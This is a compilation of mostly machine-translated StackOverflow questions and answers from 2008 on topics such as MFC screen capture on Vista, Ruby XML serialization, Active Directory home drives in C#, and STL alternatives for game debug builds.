# StackOverflow 问答 000087000-000087999

# visual-c++ - 屏幕截图在 Vista 中的 MFC 应用程序上不起作用

> ID：87007
> 
> 赞同：0
> 
> 时间：2008-09-17T20:00:08.317
> 
> 标签：visual-c++, mfc, windows-vista

我们有一些在 MFC 中构建的内部应用程序，带有 OpenGL 绘图例程。他们都使用相同的代码在屏幕上绘图并打印屏幕或将其保存为 JPEG 文件。在 Windows XP 中一切都运行良好，我需要找到一种方法让它们在 Vista 上运行。

在我们的三个应用程序中，一切正常。在剩下的一个中，我可以得到窗口边框、标题栏、菜单和任务栏，但内部从来没有出现过。正如我所说，这些应用程序使用完全相同的代码来写入屏幕并捕获窗口图像，我看到的唯一区别可能是相关的问题应用程序使用 MFC 多文档界面，而那些该工作使用单一文档界面。

要么答案不在网上，要么我在谷歌上的搜索比我想象的要差。我在 MSDN 论坛上问过，我得到的唯一实用建议是使用 GDI+ 而不是 GDI，这并没有什么不同。我对捕获和打印或保存的代码的每一部分都尝试了不同的东西，给出了一个指向窗口的指针，所以显然这是窗口本身的问题。我还没有使用 SDI 重建有问题的应用程序，我真的没有任何其他想法。

有没有人见过这样的事情？

* * *

我有四个应用程序。他们使用很多通用代码，并共享实际的 .h 和 .cpp 文件，所以我知道绘图和屏幕截图代码是相同的。

有一个 WindowtoDIB() 例程，它采用 *pWnd、源矩形和目标大小。它看起来像是经过略微改编的 Microsoft 代码，我在 Microsoft 网站上的此文件中找到了其他功能。在我的四个应用程序中，三个处理得很好，但一个没有。最明显的区别是问题之一是MDI。

在我看来，*pWnd 是问题所在。我绝对不是 MFC 专家，在我看来，问题可能在于我们在 SDI 中设置了一个窗口，而在 MDI 中设置了多个窗口。我可能将错误的 *pWnd 传递给函数。

同时，它已经开始在 64 位 Vista 测试机上正常工作，但在 32 位 Vista 机器上仍然无法正常工作。我不知道为什么。自上次测试以来，我没有改变任何东西，我认为其他人也没有。（在 32 位版本上，Print Screen 键按预期工作，但它不会将屏幕保存为 JPEG。）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-09-18T13:59:33.730

您的问题标题提到了屏幕截图，但您的实际问题没有。请详细说明。问题是您可以对您的三个应用程序进行屏幕截图，但不能对第四个应用程序进行屏幕截图吗？您可以使用可以捕获 OpenGL/DirectX 窗口的不同屏幕捕获软件。这些表面由窗口管理器直接处理，不会显示为简单的“PrtScn”。

切换到 GDI+ 不会解决它，切换到 SDI 也不会。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-18T19:14:35.110

如果它是您想要的 CView 的内容，那么是的，那应该是正确的。如果它是整个屏幕的内容（至少是内容，没有工具栏和状态栏），那么您应该将 CMainFrame 传递给它（这是可能已更改的默认名称，派生自 CMDIFrameWnd ）。

你能发布WindowToDIB（）的代码吗？我刚刚尝试过，它适用于我 (TM)，但视图中没有 OpenGL 代码。尝试将以下窗口传递给 WindowToDIB() 函数：

CMainFrame*`mainfrm = static_cast<CMainFrame*>(::AfxGetMainWnd());`

```
- mainfrm

- mainfrm->MDIGetActive()

- mainfrm->MDIGetActive()->GetActiveView() 
```

看看你得到了什么。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T20:04:04.253

每个窗口的内容都是directX表面，只由显卡中的窗口管理器组装。除非您关闭新界面 (DWM) 或专门用于从 DWM 进行屏幕捕获的代码，否则您将无法捕获此内容。

[维基百科对桌面窗口管理器（DWM）](http://en.wikipedia.org/wiki/Desktop_Window_Manager)有很好的描述

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-18T16:54:02.220

对不起，我还是不明白。您正试图让 Print Screen 键在所有四个应用程序上工作？或者您正试图让 WindowtoDIB() 函数工作，该函数需要应用程序本身的“屏幕截图”（来自您自己的应用程序），以便可以将其保存为图像文件？

另外，“他的 Print Screen 键按预期工作，但它不会将屏幕保存为 JPEG。”是什么意思？Print Screen 仅复制到剪贴板，在 Paint 中粘贴时会发生什么？

如果您的 WindowtoDIB() 函数仅“捕获”您传递给它的窗口，那么是的，您的 MDI 子窗口不会出现。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-12-15T16:56:50.600

我们最终通过创建不同的 OpenGL 上下文并绘制所有内容来解决这个问题。我们放弃了屏幕截图。

# xhtml - 将 HTML 与基于 XML 的语言（如 SVG）一起使用的最佳实践是什么？

> ID：87010
> 
> 赞同：1
> 
> 时间：2008-09-17T20:00:27.723
> 
> 标签：xhtml, svg, doctype, mathml, html4

通过浏览此站点和其他地方，我了解到目前将网站作为 XHTML 服务[被认为是有害](http://hixie.ch/advocacy/xhtml)的。

`application/xhtml+xml`目前大多数浏览者不支持交付 XHTML 并按原样提供服务，交付 xhtml`text/html`至多是我自己的安慰剂，最坏的情况是通常在您最不需要的时候破坏网站的秘诀。

所以我们最终回到了 html 4.01。如果我将我的页面作为 html 4.01 提供，是否可以在页面上使用 SVG 或任何其他基于 XML 的语言？

如果是这样，怎么做？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-10-11T23:24:45.900

在 HTML 中，您将无法直接插入 SVG。

`<object>`您可以使用/嵌入 SVG 文件，也可以`<embed>`在尖端浏览器（Opera、Safari）`<img>`和 CSS中嵌入 SVG 文件`background-image`。

您可以将 SVG 放在`data:`URI 中以避免使用外部文件。

可以借助 Unicode 和基本的 HTML/CSS 编写简单的数学表达式（Opera 9.5[通过 CSS 支持大量的 MathML](http://www.w3.org/TR/mathml-for-css/)）。对于更复杂的事情，您需要使用图像，就像 Wikipedia 一样。

HTML 会误解命名空间前缀，因此您将无法（正确）将其他 XML 标记与 HTML DOM 一起使用。HTML5 具有`data-*`用于特定于应用程序的标记添加的属性。对于元数据，请考虑微格式。

However if you want to embed XML only for non-browsers (robots), then you could use HTML-compatible XHTML subset and HTTP content negotiation to send proper XML with proper type to clients that understand it (*if* you thoroughly test page in both XML and HTML modes, then it won't be harmful).

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2008-09-17T21:15:06.127

您可以（阅读我自己没有尝试过）使用嵌入式对象并相应地键入它。

# xml - 用于快速和肮脏的 XML 序列化的 Ruby 代码？

> ID：87021
> 
> 赞同：7
> 
> 时间：2008-09-17T20:01:54.007
> 
> 标签：xml, ruby, serialization, xml-serialization, metaprogramming

给定一个中等复杂的 XML 结构（数十个元素，数百个属性），没有 XSD 并希望创建一个对象模型，避免编写样板 from_xml() 和 to_xml() 方法的优雅方法是什么？

例如，给定：

```
<Foo bar="1"><Bat baz="blah"/></Foo> 
```

如何避免编写无休止的序列：

```
class Foo
  attr_reader :bar, :bat

  def from_xml(el)
     @bar = el.attributes['bar']
     @bat = Bat.new()
     @bat.from_xml(XPath.first(el, "./bat")
  end
 etc... 
```

我不介意明确创建对象结构；这是我确信可以通过一些更高级别的编程来处理的序列化......

* * *

我不想为每个类保存一两行（通过将 from_xml 行为移动到初始化程序或类方法等）。我正在寻找复制我的心理过程的“元”解决方案：

“我知道每个元素都将成为类名。我知道每个 XML 属性都将成为字段名。我知道要分配的代码就是 @#{attribute_name} = el.[#{attribute_name} ] 然后递归到子元素。然后在 to_xml 上反向。

* * *

我同意“构建器”类加上 XmlSimple 似乎是正确的道路的建议。XML -> 哈希 -> ? -> 对象模型（和利润！）

* * *

2008 年 9 月 18 日更新：@Roman、@fatgeekuk 和 @ScottKoon 的出色建议似乎已经解决了问题。我下载了 HPricot 源代码，看看它是如何解决问题的；关键方法显然是 instance_variable_set 和 class_eval 。irb 的工作非常令人鼓舞，现在正在走向实施....非常兴奋

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2008-09-17T20:12:58.473

您可以使用 Builder 而不是创建您的 to_xml 方法，并且您可以使用 XMLSimple 将您的 xml 文件拉入 Hash 而不是使用 from _xml 方法。不幸的是，我不确定您是否真的会从使用这些技术中获得这么多。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-09-18T12:25:09.450

我建议使用 XmlSimple 作为开始。在输入文件上运行 XmlSimple#xml_in 后，您会得到一个哈希值。然后可以递归进去（obj.instance_variables），把所有内部哈希（element.is_a?(Hash)）转成同名对象，例如：

```
obj.instance_variables.find {|v| obj.send(v.gsub(/^@/,'').to_sym).is_a?(Hash)}.each do |h|
  klass= eval(h.sub(/^@(.)/) { $1.upcase }) 
```

也许可以找到一种更清洁的方法来做到这一点。之后，如果您想从这个新对象创建一个 xml，您可能需要更改 XmlSimple#xml_out 以接受另一个选项，该选项将您的对象与它用于作为参数接收的通常哈希区分开来，然后您必须编写您的 XmlSimple#value_to_xml 方法版本，因此它将调用访问器方法而不是尝试访问哈希结构。另一种选择是让所有类通过返回所需的实例变量来支持 [] 运算符。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T20:07:22.340

您能否定义一个缺少的方法来允许您执行以下操作：

@bar = el.bar？那将摆脱一些样板。如果 Bat 总是以这种方式定义，您可以将 XPath 推送到初始化方法中，

```
class Bar
  def initialize(el)
    self.from_xml(XPath.first(el, "./bat"))
  end
end 
```

Hpricot 或 REXML 也可能有帮助。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-18T11:08:35.030

我会继承 attr_accessor 来为你构建你的 to_xml 和 from_xml。

像这样的东西（注意，这不是完整的功能，只是一个大纲）

```
class XmlFoo
  def self.attr_accessor attributes = {}
    # need to add code here to maintain a list of the fields for the subclass, to be used in to_xml and from_xml
    attributes.each do |name, value|
      super name
    end
  end

  def to_xml options={}
    # need to use the hash of elements, and determine how to handle them by whether they are .kind_of?(XmlFoo)
  end

  def from_xml el
  end
end 
```

然后你可以像....一样使用它

```
class Second < XmlFoo
  attr_accessor :first_attr => String, :second_attr => Float
end

class First < XmlFoo
  attr_accessor :normal_attribute => String, :sub_element => Second
end 
```

希望这能提供一个总体思路。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-18T05:46:03.527

你能尝试[用 hpricot 解析 XML](http://www.rubyinside.com/parse-xml-quickly-and-easily-with-hpricot-166.html)并使用输出来构建一个普通的旧 Ruby 对象吗？[免责声明]我没有试过这个。

# c# - 查询 Web 服务以获取消息列表？

> ID：87023
> 
> 赞同：0
> 
> 时间：2008-09-17T20:02:07.067
> 
> 标签：c#, .net, web-services, soap

是否有一种直接的方法来查询 Web 服务以查看它支持哪些消息？我正在处理的 C# .NET 应用程序需要能够处理旧版本的 Web 服务，它没有实现我要发送的消息。Web 服务不公开版本号，因此计划 B 是查看消息是否已定义。

我假设我可以只为 WSDL 发出 HTTP 请求并解析它，但在我走这条路之前，我想确保没有更简单的方法。

更新：我决定获取 WSDL 并直接获取消息。这是获取所有消息的草稿：

```
HttpWebRequest webRequest = (HttpWebRequest) WebRequest.Create( "http://your/web/service/here.asmx?WSDL" );
webRequest.PreAuthenticate = // details elided
webRequest.Credentials = // details elided
webRequest.Timeout = // details elided
HttpWebResponse webResponse = (HttpWebResponse) webRequest.GetResponse();

XPathDocument xpathDocument = new XPathDocument( webResponse.GetResponseStream() );
XPathNavigator xpathNavigator = xpathDocument.CreateNavigator();

XmlNamespaceManager xmlNamespaceManager = new XmlNamespaceManager( new NameTable() );
xmlNamespaceManager.AddNamespace( "wsdl", "http://schemas.xmlsoap.org/wsdl/" );

foreach( XPathNavigator node in xpathNavigator.Select( "//wsdl:message/@name", xmlNamespaceManager ) )
{
    string messageName = node.Value;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2008-09-17T20:46:33.230

解析 WSDL 可能是最简单的方法。使用 WCF，还可以在运行时下载 WSDL，本质上是通过代码在其上运行 svcutil，最后得到一个动态生成的代理，您可以检查其结构。有关运行时生成的代理的示例，请参阅[https://docs.microsoft.com/en-us/archive/blogs/vipulmodi/dynamic-programming-with-wcf 。](https://docs.microsoft.com/en-us/archive/blogs/vipulmodi/dynamic-programming-with-wcf)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-09-17T20:13:37.473

我很确定 WSDL 是做到这一点的方法。

# java - 在哪里可以找到 Java 6 JSSE/JCE 源代码？

> ID：87030
> 
> 赞同：29
> 
> 时间：2008-09-17T20:03:01.290
> 
> 标签：java, jce, jsse

我在哪里可以下载最新版本的 Java 的 JSSE 和 JCE 源代码？[https://jdk6.dev.java.net/](https://jdk6.dev.java.net/)上提供的源代码构建不包括 javax.crypto (JCE) 包或 com.sun.net.ssl.internal (JSSE) 包。

无法调试这些类使得解决 SSL 问题变得异常困难。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2008-09-17T20:11:00.303

there: [openjdk javax.net](http://openjdk.java.net/groups/security/) in the security group

```
src/share/classes/javax/net
src/share/classes/com/sun/net/ssl
src/share/classes/sun/security/ssl
src/share/classes/sun/net/www/protocol/https 
```

also on this page:

```
src/share/classes/javax/crypto
src/share/classes/com/sun/crypto/provider
src/share/classes/sun/security/pkcs11
src/share/classes/sun/security/mscapi 
```

> These directories contain the core cryptography framework and three providers (SunJCE, SunPKCS11, SunMSCAPI). **SunJCE** contains Java implementations of many popular algorithms, and the latter two libraries allow calls made through the standard Java cryptography APIs to be routed into their respective native libraries.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2011-01-27T05:47:40.797

我从以下位置下载了 src jar：http: [//download.java.net/jdk6/source/](http://download.java.net/jdk6/source/)

注意：这是一个自解压 jar，因此仅链接到它是行不通的。

......`jar -xvf <filename>`也不会工作。

你需要：`java -jar <filename>`

干杯，杰

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2011-08-29T08:13:36.970

如果您只想阅读源代码：

[http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/6-b14/sun/security/ssl/SSLSocketImpl.java](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/6-b14/sun/security/ssl/SSLSocketImpl.java)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-09-30T22:29:19.360

虽然这不能直接回答您的问题，但使用 javax.net.debug 系统属性帮助我解决了 SSL 问题。-Djavax.net.debug=all 几乎可以为您提供所有细节。[JSSE Debugging Utilities](http://docs.huihoo.com/java/se/jdk6/docs/guide/security/jsse/JSSERefGuide.html#Debug)中提供了相关文档。

注意：我已经看到在 Java 1.4 和可能的 1.5 级别上，带有选项“all”的输出不像在 Java 1.6 级别上使用相同选项那样完整。例如，1.6 显示了网络（套接字）读写的实际内容。也许 1.4 和 1.5 的某些级别也可以，但 1.6 更一致。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-09-17T20:17:26.933

将[Jad](http://www.kpdus.com/jad.html)放在您的系统路径上。为 Eclipse安装[JadClipse](http://jadclipse.sourceforge.net/)插件。使用武力，阅读反编译的源代码。:-)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-03-12T10:42:06.603

出于某种未知原因，Orcale 没有为 JSE 发布 source.jar 和 javadocs jar。我发现只有一个地方可以找到它们[http://jdk7src.sourceforge.net/](http://jdk7src.sourceforge.net/)但它已过时且非官方。唯一的一种方法是克隆 OpenJDK 存储库

# java - 色彩还原（Java 中）

> ID：87062
> 
> 赞同：2
> 
> 时间：2008-09-17T20:05:18.883
> 
> 标签：java, image-manipulation, colors, reduce

我想找到一种方法来获取 JPEG（或 GIF/PNG）图像并将颜色数量减少到例如 20。有人可以推荐一些库或其他参考吗？也欢迎其他语言的源代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T20:13:07.867

查看[Java 高级成像 API](http://java.sun.com/javase/technologies/desktop/media/jai/)。该 API 中实现了许多算法来进行颜色减少。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-17T20:32:02.720

JAI（Java Advanced Imaging API）可以完成这项工作，但它有一些缺点。

API 远非易于使用，特别是如果您关心内存占用...

恕我直言，Java 不是成像任务的最佳平台。您可以尝试[ImageMagick](http://www.imagemagick.org/script/index.php)，这是一个很棒的命令行工具，被 Flickr 等流行网站使用。您可以使用命令行（*Runtime.exec()*）或[Jmagick](http://sourceforge.net/projects/jmagick/)将 ImageMagick 集成到您的 Java 应用程序中，后者是 ImageMagick 的 Java 桥

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-09-17T20:47:39.827

这似乎是基于 ImageMagick 的 java 中的一个简单实现：

[http://gurge.com/amd/java/quantize/index.html](http://gurge.com/amd/java/quantize/index.html)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T20:07:52.653

寻找关于颜色量化的算法，尤其是中值切割。您会发现许多使用这些关键字的示例。为您执行此操作的库包括具有多种语言绑定的[ImageMagick 。](http://www.imagemagick.org/)[JMagick](http://sourceforge.net/projects/jmagick/)是 Java 风格的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2008-09-17T20:18:13.610

查看[http://www.jhlabs.com/ip/filters/index.html](http://www.jhlabs.com/ip/filters/index.html)上的图像过滤器。[QuantizeFilter](http://www.jhlabs.com/ip/filters/QuantizeFilter.html)似乎做你想做的事。

* * *

## 回答 #6

> 赞同：-2
> 
> 时间：2008-10-28T17:51:55.357

JAI API 是要走的路。与今天的 JVM 性能非常接近的汇编代码。我知道我已经做到了。

# c# - Attempting to update a user's "connect to:" home directory path in AD using C#

> ID：87071
> 
> 赞同：1
> 
> 时间：2008-09-17T20:06:22.563
> 
> 标签：c#, active-directory

I have a small application I am working on that at one point needs to update a user's home directory path in AD under the profile tab where it allows you to map a drive letter to a particular path. The code I have put together so far sets the Home Folder Local path portion OK, but I'm trying to figure out the name for the "connect" portion, as well as how to select the drive letter. Go easy on me, I'm new to C#. Thanks!!

Here's my code that updates the Local path section.

```
 DirectoryEntry deUser = new
                DirectoryEntry(findMeinAD(tbPNUID.Text));
                deUser.InvokeSet("HomeDirectory", tbPFolderVerification.Text);
                deUser.CommitChanges(); 
```

Where findMeinAD is a method that looks up a user's info in AD and tbPFolderVerification.Text is a text box in the form that contains the path I'd like to set a particular drive to map to.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-09-17T20:12:16.447

You may need to set the HomeDrive property as well:

```
DirectoryEntry deUser = new DirectoryEntry(findMeinAD(tbPNUID.Text));
deUser.InvokeSet("HomeDirectory", tbPFolderVerification.Text);
deUser.InvokeSet("HomeDrive", "Z:");
deUser.CommitChanges(); 
```

# ruby-on-rails - 在 Rails 中，使用 find 和 :select 后，我 的对象不保存

> ID：87090
> 
> 赞同：3
> 
> 时间：2008-09-17T20:09:11.370
> 
> 标签：ruby-on-rails, ruby, activerecord

运行类似：

@users = User.find(:first, :select => "name, lastname, Salary") for @user in @users do @user.salary = 100000 @user.save end

在 Mysql 表中查找之后，用户没有更新。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2008-09-17T20:10:51.163

ActiveRecord doesn't know the object's id, in order to save the data. So include the id field in :select, like the example below:

@users = User.find(:first, :select => "id, name, lastname, salary")

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2008-09-18T16:21:55.980

John Ruby 是正确的，您需要在选择中包含对象的 id。
此外，您很少需要使用 :select 选项。您可以使用连接，或者如果选择整行存在真正的性能问题，但这并没有太多。
而且您真的不需要将所有这些变量设置为实例变量 (@)。循环中的@user 可以是本地变量。如果您确实需要所有用户为@users，您可以这样做：

```
@users = User.find(:all, :select => "id、name、lastname、salary")
@users.each 做 |user|
  user.salary = 10000
  用户保存
结尾

```

您可能还想查看 ActiveRecord 的 update_all 以进行简单更改。但请注意，这不会调用任何保存回调。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2008-09-17T20:19:04.950

尝试使用 .update 或 .update_attributes 代替：它们是为编辑而设计的（而不是 .save，它用于创建新行）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-09-17T20:21:01.980

使用 .save！如果保存失败也会抛出错误。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2010-03-05T01:05:03.727

我意识到这是一个非常老的问题，但我相信正确的答案是 :select 返回的任何对象都是只读的。

请参阅 Rails 官方的 Active Record 查询指南，第 3.2 节：http:
[//guides.rubyonrails.org/active_record_querying.html](http://guides.rubyonrails.org/active_record_querying.html)

奇怪的是，我没有在 API 中看到这一点。

# c++ - STL 替代方案

> ID：87096
> 
> 赞同：27
> 
> 时间：2008-09-17T20:09:47.467
> 
> 标签：c++, performance, stl, debug-build

我真的很讨厌使用 STL 容器，因为它们使我的代码的调试版本运行得非常缓慢。其他人使用什么来代替具有合理性能的调试构建的 STL？

我是一名游戏程序员，这在我从事的许多项目中一直存在问题。当你对所有东西都使用 STL 容器时，很难达到 60 fps。

我的大部分工作都使用 MSVC。

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2008-09-17T20:38:24.047

EASTL 是一种可能性，但仍不完美。Electronic Arts 的 Paul Pedriana 对各种 STL 实现在游戏应用程序中的性能进行了调查，其摘要可在此处找到： [http ://www.open-std.org/jtc1/sc22/wg21/docs/papers/2007 /n2271.html](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2007/n2271.html)

其中一些调整正在审查中以包含在 C++ 标准中。

请注意，即使 EASTL 也不会针对未优化的情况进行优化。不久前我有一个带有一些时间的 excel 文件，但我想我已经丢失了它，但是对于访问它是这样的：

```
 debug   release
STL      100        10
EASTL     10         3
array[i]   3         1 
```

我取得的最大成功是滚动自己的容器。您可以将它们降低到接近数组 [x] 的性能。

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2008-09-17T20:37:16.653

我的经验是，设计良好的 STL 代码在调试版本中运行缓慢，因为优化器已关闭。STL 容器发出大量对构造函数和 operator= 的调用（如果它们是轻量级的）在发布版本中被内联/删除。

此外，Visual C++ 2005 及更高版本在发布和调试版本中都启用了 STL 检查。对于重 STL 的软件来说，它是一个巨大的性能消耗者。可以通过为所有编译单元定义 _SECURE_SCL=0 来禁用它。请注意，在不同的编译单元中具有不同的 _SECURE_SCL 状态几乎肯定会导致灾难。

您可以在关闭检查的情况下创建第三个构建配置，并使用它来调试性能。我建议您保留调试配置并进行检查，因为捕获错误的数组索引和类似的东西非常有帮助。

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2008-09-17T20:27:48.860

如果您正在运行视觉工作室，您可能需要考虑以下事项：

```
#define _SECURE_SCL 0
#define _HAS_ITERATOR_DEBUGGING 0 
```

这仅适用于迭代器，您正在执行哪种类型的 STL 操作？你可能想看看优化你的内存操作；即，使用 resize() 一次插入多个元素，而不是使用 pop/push 一次插入一个元素。

* * *

## 回答 #4

> 赞同：7
> 
> 时间：2008-09-17T20:39:07.303

对于大型、性能关键的应用程序，构建您自己的容器专门为您的需求量身定制可能值得花时间投资。

我在这里谈论的是*真正的*游戏开发。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2008-09-17T20:11:20.880

I'll bet your STL uses a checked implementation for debug. This is probably a good thing, as it will catch iterator overruns and such. If it's that much of a problem for you, there may be a compiler switch to turn it off. Check your docs.

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2008-09-17T20:16:05.893

如果您使用的是 Visual C++，那么您应该看看这个：

[http://channel9.msdn.com/shows/Going+Deep/STL-Iterator-Debugging-and-Secure-SCL/](http://channel9.msdn.com/shows/Going+Deep/STL-Iterator-Debugging-and-Secure-SCL/)

以及该页面的链接，其中涵盖了 MS/Dinkware STL 所做的所有调试模式检查的各种成本和选项。

如果您要问这样一个依赖于平台的问题，最好也提及您的平台......

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2008-09-18T02:50:56.333

MSVC 在调试版本中使用了一个非常重量级的检查迭代器实现，其他人已经讨论过，所以我不会重复它（但从那里开始）

您可能感兴趣的另一件事是您的“调试构建”和“发布构建”可能涉及更改（至少）4 个只是松散相关的设置。

1.  生成一个允许符号调试的 .pdb 文件（cl /Zi 和链接 /DEBUG）。您可能希望将 /OPT:ref 添加到链接器选项；链接器在不创建 .pdb 文件时会丢弃未引用的函数，但在 /DEBUG 模式下它会保留所有函数（因为调试符号引用了它们），除非您明确添加它。
2.  使用 C 运行时库的调试版本（可能是 MSVCR*D.dll，但这取决于您使用的运行时）。这归结为 /MT 或 /MTd （或其他如果不使用 dll 运行时）
3.  关闭编译器优化 (/Od)
4.  设置预处理器#defines DEBUG 或 NDEBUG

这些可以独立切换。第一个在运行时性能上没有任何成本，尽管它增加了大小。第二个让一些函数更昂贵，但对 malloc 和 free 的影响巨大；调试运行时版本小心地用值“毒化”它们接触的内存，以清除未初始化的数据错误。我相信通过 MSVCP* STL 实现，它还消除了通常完成的所有分配池，因此泄漏准确地显示了您认为的块，而不是它一直在分配的更大的内存块；这意味着它会在更慢的情况下对 malloc 进行更多调用。第三; 好吧，那个人做了很多事情（[这个问题](https://stackoverflow.com/questions/69250/why-does-a-cc-program-often-have-optimization-turned-off-in-debug-mode)对这个主题有一些很好的讨论）。不幸的是，如果您希望单步运行顺利，则需要它。第四个以各种方式影响许多库，但最值得注意的是它编译或消除了 assert() 和朋友。

因此，您可能会考虑使用这些选择的较少组合进行构建。我大量使用具有符号（/Zi 和链接 /DEBUG）和断言（/DDEBUG）的构建，但仍然优化（/O1 或 /O2 或您使用的任何标志）但堆栈帧指针保留用于清除回溯 (/Oy-) 并使用正常的运行时库 (/MT)。这执行接近我的发布版本并且是半可调试的（回溯很好，单步执行在源代码级别有点古怪；组装级别当然可以正常工作）。你可以有很多你想要的配置；只需克隆您的发行版并打开调试的任何部分似乎有用。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2008-09-17T20:20:25.837

查看[EASTL](http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2007/n2271.html)。

* * *

## 回答 #9

> 赞同：3
> 
> 时间：2011-01-15T01:50:11.453

抱歉，我不能发表评论，所以这里有一个答案：EASTL 现在可以在 github 上获得：[https ://github.com/paulhodge/EASTL](https://github.com/paulhodge/EASTL)

* * *

## 回答 #10

> 赞同：1
> 
> 时间：2008-09-18T13:56:06.500

[Qt](http://qt-project.org/)用不同的接口重新实现了大多数 c++ 标准库的东西。它看起来不错，但对于商业许可版本来说可能很昂贵。

编辑：Qt 已经在[LGPL](http://en.wikipedia.org/wiki/GNU_Lesser_General_Public_License)下发布，这通常可以在商业产品中使用它而无需商业版本（它仍然存在）。

* * *

## 回答 #11

> 赞同：1
> 
> 时间：2008-09-17T20:37:02.177

[ACE 库](http://www.cs.wustl.edu/~schmidt/ACE.html "王牌图书馆")呢？它是一个开源的面向对象的并发通信软件框架，但它也有一些容器类。

* * *

## 回答 #12

> 赞同：1
> 
> 时间：2008-09-17T20:58:26.727

使用 C++ 中的面向对象设计模式检查数据结构和算法 作者：Bruno Preiss [http://www.brpreiss.com/](http://www.brpreiss.com/)

* * *

## 回答 #13

> 赞同：1
> 
> 时间：2008-09-17T20:25:34.717

Ultimate++ 有自己的一组容器 - 不确定您是否可以将它们与库的其余部分分开使用：[http ://www.ultimatepp.org/](http://www.ultimatepp.org/)

* * *

## 回答 #14

> 赞同：0
> 
> 时间：2008-09-17T20:11:51.987

STL containers should not run "really slowly" in debug or anywhere else. Perhaps you're misusing them. You're not running against something like ElectricFence or Valgrind in debug are you? They slow anything down that does lots of allocations.

All the containers can use custom allocators, which some people use to improve performance - but I've never needed to use them myself.

* * *

## 回答 #15

> 赞同：0
> 
> 时间：2019-08-02T11:04:15.570

还有 ETL [https://www.etlcpp.com/](https://www.etlcpp.com/)。该库特别针对时间关键（确定性）应用程序

从网页：

> ETL 并非旨在完全取代 STL，而是对其进行补充。其设计目标涵盖四个主要领域。
> 
> *   创建一组容器，其中大小或最大大小在编译时确定。这些容器应该在很大程度上等同于 STL 中提供的容器，并具有兼容的 API。
> *   与 C++ 03 兼容，但尽可能多地实现 C++ 11 的添加。
> *   有确定性的行为。
> *   添加标准库中不存在的其他有用组件。
> 
> 嵌入式模板库专为资源较少的嵌入式应用程序而设计。它定义了一组容器、算法和实用程序，其中一些模拟了 STL 的一部分。没有动态内存分配。该库不使用堆。所有容器（除了侵入式类型）都具有固定容量，允许在编译时确定所有内存分配。该库适用于任何支持 C++03 的编译器。

# listview - How to SelectAll / SelectNone in .NET 2.0 ListView?

> ID：87101
> 
> 赞同：3
> 
> 时间：2008-09-17T20:10:38.293
> 
> 标签：listview, selectall

What is a good way to select all or select no items in a listview without using:

```
foreach (ListViewItem item in listView1.Items)
{
 item.Selected = true;
} 
```

or

```
foreach (ListViewItem item in listView1.Items)
{
 item.Selected = false;
} 
```

I know the underlying Win32 listview common control supports [LVM_SETITEMSTATE message](http://msdn.microsoft.com/en-us/library/bb761196(VS.85).aspx) which you can use to set the selected state, and by passing -1 as the index it will apply to all items. I'd rather not be PInvoking messages to the control that happens to be behind the .NET Listview control (I don't want to be a bad developer and rely on undocumented behavior - for when they change it to a fully managed ListView class)

## Bump

[Pseudo Masochist](https://stackoverflow.com/questions/87101/how-to-selectall-selectnone-in-net-2-0-listview/87209#87209) has the **SelectNone** case:

```
ListView1.SelectedItems.Clear(); 
```

Now just need the **SelectAll** code

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2008-09-17T20:22:12.133

Either

```
ListView1.SelectedItems.Clear(); 
```

or

```
ListView1.SelectedIndices.Clear(); 
```

should do the trick for select none, anyway.

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2011-05-23T13:10:19.523

Wow this is old... :D

**SELECT ALL**

```
 listView1.BeginUpdate(); 
 foreach (ListViewItem i in listView1.Items)
 {
     i.Selected = true;
 }
 listView1.EndUpdate(); 
```

**SELECT INVERSE**

```
 listView1.BeginUpdate(); 
 foreach (ListViewItem i in listView1.Items)
 {
     i.Selected = !i.Selected;
 }
 listView1.EndUpdate(); 
```

`BeginUpdate` and `EndUpdate` are used to disable/enable the control redrawing while its content is being updated... I figure it would select all quicker, since it would refresh only once, and not `listView.Items.Count` times.

# asp.net - 如何修复 Win Server 2k8 和 IIS7 上的 404.17 错误

> ID：87107
> 
> 赞同：20
> 
> 时间：2008-09-17T20:11:10.273
> 
> 标签：asp.net, iis-7

